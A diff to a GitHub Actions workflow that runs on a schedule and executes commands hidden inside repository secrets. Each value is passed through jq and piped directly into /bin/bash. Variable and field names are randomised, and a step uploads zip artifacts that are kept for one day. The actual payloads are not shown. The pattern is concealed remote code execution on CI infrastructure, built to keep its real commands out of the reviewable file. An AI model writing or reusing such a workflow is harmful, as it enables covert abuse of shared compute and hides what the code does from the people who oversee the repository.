@@ -1,22 +1,24 @@
 name: shilifeiyi
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '4 1/6 * * *'
-jobs:  # 26209
+    - cron: '39 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: shilifeiyi
         env:
-          w17: ${{ secrets.w17 }}
+          bog6869: ${{ secrets.bog6869 }}
         run: |
-          echo $w17 | jq -r .beam1 | /bin/bash
-          echo $mrlnl567 | jq -r .r223 | /bin/bash
-          echo $btvu1982 | jq -r .alpy96454 | /bin/bash
-          echo $vvz1255 | jq -r .vjfa275 | /bin/bash
-          echo $pgs74 | jq -r .xgot36 | /bin/bash
-          echo $qlkp388 | jq -r .rjnhu9739 | /bin/bash
-          echo $r875 | jq -r .rmbc8 | /bin/bash
+          printf '%s' "$bog6869" | jq -r .e63003 | /bin/bash
+          printf '%s' "$bpo79101" | jq -r .h96512 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: VLSsSyaE
+          path: "*.zip"
+          retention-days: 1
